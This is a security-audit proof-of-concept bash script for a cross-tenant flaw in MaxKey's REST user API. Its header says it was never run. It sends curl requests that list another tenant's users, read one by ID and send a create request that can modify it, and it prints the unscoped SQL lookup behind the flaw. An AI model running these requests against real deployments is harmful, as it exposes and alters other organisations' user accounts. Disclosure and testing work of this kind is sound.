#!/usr/bin/env bash
# =============================================================================
#  repro-cross-tenant.sh
#
#  ###########################################################################
#  #  NOT EXECUTED BY THE AUDIT.                                          #
#  #  This script was WRITTEN but NEVER RUN. The audit environment had no #
#  #  MaxKey instance, no network access and no database. Every           #
#  #  "EXPECTED IF VULNERABLE" / "EXPECTED IF FIXED" statement below is a #
#  #  PREDICTION derived from reading the source, NOT an observation.     #
#  ###########################################################################
#
#  FINDING
#    maxkey-20261002-rest-cross-tenant-no-instid
#
#  SOURCE BASIS (verified by reading the repo at commit
#                 3e5662b1a91291c0d85de826544119c86e77d8e6)
#    * The mapper offers BOTH an unscoped and a scoped lookup:
#        maxkey-persistence/.../mapper/UserInfoMapper.java:42
#          @Select("select * from mxk_userinfo where username = #{username} and status = ACTIVE")
#          UserInfo findByUsername(@Param("username") String username);
#        maxkey-persistence/.../mapper/UserInfoMapper.java:45
#          @Select("select * from mxk_userinfo where username = #{username} and instid = #{instId} and status = ACTIVE")
#          UserInfo findByUsernameAndInstId(...);
#    * The REST controller uses the UNSCOPED one:
#        maxkey-web-apis/maxkey-web-api-rest/.../rest/RestUserInfoController.java:62  (create)
#          UserInfo loadUserInfo = userInfoService.findByUsername(userInfo.getUsername());
#        RestUserInfoController.java:75  (update)
#          UserInfo loadUserInfo = userInfoService.findByUsername(userInfo.getUsername());
#    * The list endpoint accepts a caller-supplied tenant:
#        RestUserInfoController.java:91-98
#          @GetMapping(value = { "/.search" })
#          public Message<JpaPageResults<UserInfo>> search(@ModelAttribute UserInfo userInfo) {
#              if (StringUtils.isBlank(userInfo.getInstId())) { userInfo.setInstId("1"); }
#              return new Message<>(userInfoService.fetchPageResults(userInfo));
#          }
#      i.e. the tenant is only DEFAULTED to "1" when the caller omits it; a
#      caller that supplies instId=2 is believed.
#    * Schema context: mxk_userinfo has a NOT NULL INSTID column and a GLOBAL
#      UNIQUE constraint on USERNAME (sql/v4.2.0/maxkey.sql:1588ff).
#
#  WHAT THIS SCRIPT DOES
#    With two institutions present (see seed/two-tenant-seed.sql), it shows
#    whether a caller scoped to tenant A can read or modify a user belonging to
#    tenant B, and whether .search honours a caller-supplied instId.
#
#  WHAT IT CANNOT PROVE
#    It does not prove authorisation is absent, only that the TENANT BOUNDARY
#    is not enforced by the handler or the SQL. A deployment may have an
#    external gateway that filters by tenant; if so you will see the request
#    rejected at the gateway, which this script reports as inconclusive rather
#    than as evidence of a fix in MaxKey itself.
#
#  PREREQUISITES
#    * A DISPOSABLE MaxKey instance you own and are authorised to test.
#    * seed/two-tenant-seed.sql applied (creates tenant 'poc-inst-2' and the
#      user 'poc_tenant2_user').
#    * An admin credential for tenant A. MaxKey protects /api/** with its own
#      scheme; supply it as HTTP Basic unless your deployment issues bearer
#      tokens instead. Set POC_AUTH_MODE=basic (default) or POC_AUTH_MODE=bearer.
#    * curl.
#
#  USAGE
#    POC_I_HAVE_AUTHORIZATION=1 \
#    POC_TARGET_HOST=http://127.0.0.1:8080 \
#    POC_ADMIN_USER=admin POC_ADMIN_PASS=whatever-you-set \
#    ./repro-cross-tenant.sh
#
#  Environment:
#    POC_TARGET_HOST      (required) base URL of the disposable instance
#    POC_I_HAVE_AUTHORIZATION=1  (required) acknowledgement of authorisation
#    POC_ADMIN_USER       (required for auth) tenant-A admin username
#    POC_ADMIN_PASS       (required for auth) tenant-A admin password
#    POC_AUTH_MODE        (optional) "basic" (default) or "bearer"
#    POC_BEARER_TOKEN     (required when POC_AUTH_MODE=bearer)
#    POC_TENANT_A_INSTID  (optional, default: 1)          the caller's own tenant
#    POC_TENANT_B_INSTID  (optional, default: poc-inst-2) the victim's tenant
#    POC_TENANT_B_USER    (optional, default: poc_tenant2_user)
#    POC_TENANT_B_ID      (optional, default: poc-user-tenant2)
# =============================================================================

set -uo pipefail
cd "$(dirname "$0")"
# shellcheck source=_lib.sh
. ./_lib.sh

SCRIPT_NAME="repro-cross-tenant.sh"
poc_guard "$SCRIPT_NAME"

HOST="${POC_TARGET_HOST%/}"
require POC_ADMIN_USER "Set the tenant-A administrator username."
require POC_ADMIN_PASS "Set the tenant-A administrator password."

AUTH_MODE="${POC_AUTH_MODE:-basic}"
INST_A="${POC_TENANT_A_INSTID:-1}"
INST_B="${POC_TENANT_B_INSTID:-poc-inst-2}"
USER_B="${POC_TENANT_B_USER:-poc_tenant2_user}"
ID_B="${POC_TENANT_B_ID:-poc-user-tenant2}"

if [ "$AUTH_MODE" = "basic" ]; then
  AUTH_ARGS=(-u "$POC_ADMIN_USER:$POC_ADMIN_PASS")
else
  require POC_BEARER_TOKEN "Set POC_BEARER_TOKEN when POC_AUTH_MODE=bearer."
  AUTH_ARGS=(-H "Authorization: Bearer $POC_BEARER_TOKEN")
fi

API="$HOST/api/idm/Users"
trap poc_cleanup EXIT

echo
echo "=============================================================================="
echo " Finding 3: REST cross-tenant access, no instId scoping"
echo "   caller tenant A : $INST_A"
echo "   victim  tenant B: $INST_B"
echo "   victim  user    : $USER_B (id $ID_B)"
echo "=============================================================================="
echo
echo "  A note on the threat model: MaxKey ships a single admin in institution 1."
echo "  The interesting case is a deployment with SEVERAL institutions where a"
echo "  lower-privileged tenant-A operator holds valid API credentials. Substitute"
echo "  that operator's credential for POC_ADMIN_USER/POC_ADMIN_PASS to test the"
echo "  real boundary. With the built-in superadmin the test proves the missing"
echo "  tenant filter, not privilege separation."
echo

# -----------------------------------------------------------------------------
# CHECK 0 — confirm the two tenants actually exist. If tenant B is missing, the
# remaining checks are meaningless.
# -----------------------------------------------------------------------------
echo "[CHECK 0] confirm both tenants are visible"
C0=$(poc_curl GET "$API/.search?instId=$INST_B" "${AUTH_ARGS[@]}")
poc_info "GET $API/.search?instId=$INST_B -> HTTP $C0"
poc_require_reachable "$API/.search" "$SCRIPT_NAME"
C0_BODY=$(poc_body)
if printf '%s' "$C0_BODY" | grep -q "$USER_B"; then
  poc_info "tenant-B user '$USER_B' is present in the response"
else
  poc_warn "tenant-B user '$USER_B' NOT found. Did you apply seed/two-tenant-seed.sql?"
  poc_warn "response was: $(printf '%s' "$C0_BODY" | head -c 300)"
  echo
  echo "ABORTING: without a victim user in a second institution there is nothing to"
  echo "        demonstrate. Apply the seed first."
  exit 3
fi

# -----------------------------------------------------------------------------
# CHECK 1 — .search honours a caller-supplied instId.
#   The handler defaults instId to "1" only when blank, so a caller that asks
#   for another tenant is believed.
# -----------------------------------------------------------------------------
echo
echo "[CHECK 1] does .search honour a caller-supplied instId?"
echo "  EXPECTED IF VULNERABLE"
echo "    * The response contains the tenant-B user '$USER_B' even though the"
echo "      caller authenticated as an institution-'$INST_A' principal."
echo "    * i.e. the caller can enumerate another tenant's directory."
echo "  EXPECTED IF FIXED"
echo "    * The tenant-B user is absent from the response, or the request is"
echo "      rejected/forbidden."
echo
C1=$(poc_curl GET "$API/.search?instId=$INST_B" "${AUTH_ARGS[@]}")
C1_BODY=$(poc_body)
poc_info "HTTP $C1"
if printf '%s' "$C1_BODY" | grep -q "$USER_B"; then
  poc_vulnerable "the tenant-B user '$USER_B' was returned to a tenant-A caller."
  echo "    excerpt:"
  printf '%s\n' "$C1_BODY" | head -c 600
  echo
else
  if printf '%s' "$C1_BODY" | grep -qiE 'forbidden|unauthor|denied|403|401'; then
    poc_fixed "the request was refused: the tenant boundary appears to be enforced."
  else
    poc_fixed "the tenant-B user was not returned to a tenant-A caller."
  fi
fi

# -----------------------------------------------------------------------------
# CHECK 2 — fetch the tenant-B user BY ID.
#   GET /api/idm/Users/{id} takes the object id directly. Note the handler
#   nulls `decipherable` before returning (RestUserInfoController.java:55), so
#   the DECIPHERABLE column is not exposed here; finding 5 does not depend on it.
# -----------------------------------------------------------------------------
echo
echo "[CHECK 2] can a tenant-A caller read a tenant-B user by object id?"
echo "  EXPECTED IF VULNERABLE"
echo "    * HTTP 200 and the body describes $USER_B, including its INSTID of $INST_B."
echo "  EXPECTED IF FIXED"
echo "    * 403/404, or a body that does not contain the tenant-B user."
echo
C2=$(poc_curl GET "$API/$ID_B" "${AUTH_ARGS[@]}")
C2_BODY=$(poc_body)
poc_info "HTTP $C2"
if [ "$C2" = "200" ] && printf '%s' "$C2_BODY" | grep -q "$USER_B"; then
  poc_vulnerable "a tenant-A caller read a tenant-B user by id over REST."
  printf '%s\n' "$C2_BODY" | head -c 600
  echo
else
  poc_fixed "the by-id read of a tenant-B user did not succeed (HTTP $C2)."
fi

# -----------------------------------------------------------------------------
# CHECK 3 — the write path, which is the more serious half.
#   POST /api/idm/Users and PUT resolve the target with the UNSCOPED
#   findByUsername, so a caller can collide against, or overwrite, a user in
#   another institution.
#   This sends a harmless marker in DISPLAYNAME only. It WILL modify the PoC
#   dummy user. Do not point it at a real user.
# -----------------------------------------------------------------------------
echo
echo "[CHECK 3] does the create path resolve usernames across tenants?"
echo "  This sends a create request whose username already exists in tenant B."
echo "  EXPECTED IF VULNERABLE"
echo "    * The response indicates the existing tenant-B record was found and"
echo "      acted upon (an update/merge), rather than rejecting the name as"
echo "      already taken. That proves the lookup ignored the tenant."
echo "  EXPECTED IF FIXED"
echo "    * A conflict/validation error saying the username already exists."
echo
echo "  NOTE: this is a WRITE. It only touches the PoC dummy user."
C3_PAYLOAD=$(printf '{"username":"%s","displayName":"%s","instId":"%s"}' \
  "$USER_B" "PoC CrossTenant Probe" "$INST_A")
C3=$(poc_curl POST "$API" "${AUTH_ARGS[@]}" \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  --data-raw "$C3_PAYLOAD")
C3_BODY=$(poc_body)
poc_info "HTTP $C3"
printf '%s\n' "$C3_BODY" | head -c 600
echo
if printf '%s' "$C3_BODY" | grep -qiE 'exist|already|duplicate|conflict'; then
  poc_fixed "the create path rejected the duplicate username, consistent with a"
  poc_fixed "tenant-aware existence check."
else
  if [ "$C3" = "200" ] || [ "$C3" = "201" ]; then
    poc_vulnerable "the create path accepted a username that exists in another tenant."
  else
    poc_inconclusive "HTTP $C3. Read the body above; decide manually."
  fi
fi

# -----------------------------------------------------------------------------
# CHECK 4 — the SQL proof, which does not depend on HTTP auth at all.
#   This is the cleanest evidence: the unscoped statement itself.
# -----------------------------------------------------------------------------
echo
echo "[CHECK 4] unscoped vs scoped lookup (run these directly in SQL)"
echo "  The unscoped statement used by the REST handler:"
echo "    SELECT USERNAME, INSTID FROM mxk_userinfo"
echo "     WHERE USERNAME = '$USER_B' AND STATUS = 1;"
echo "    -> returns the tenant-B row."
echo "  The scoped statement the code does NOT use:"
echo "    SELECT USERNAME, INSTID FROM mxk_userinfo"
echo "     WHERE USERNAME = '$USER_B' AND INSTID = '$INST_A' AND STATUS = 1;"
echo "    -> returns zero rows."
echo "  See seed/two-tenant-seed.sql for this pair with expected results."
echo "  This script cannot run SQL for you; execute it by hand."

echo
echo "[REMINDER] Re-run seed/two-tenant-seed.sql teardown when finished."
poc_summary "$SCRIPT_NAME"
